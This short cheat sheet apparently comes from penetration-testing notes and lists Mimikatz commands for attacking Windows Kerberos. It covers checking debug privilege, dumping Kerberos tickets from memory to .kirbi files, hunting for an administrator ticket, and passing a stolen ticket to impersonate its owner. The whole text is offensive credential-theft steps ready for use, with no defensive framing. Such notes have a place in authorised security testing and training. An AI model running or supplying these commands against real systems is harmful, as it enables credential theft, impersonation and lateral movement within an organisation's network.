### check privs
`privilege::debug`
Output '20' means you have admin privs

---

### export .kirbi tickets into current dir
`sekurlsa::tickets /export`

try looking for admin ticket from krbtgt

---

### pass the ticket
`kerberos::ptt <ticket>` 
will cache and impersonate given ticket
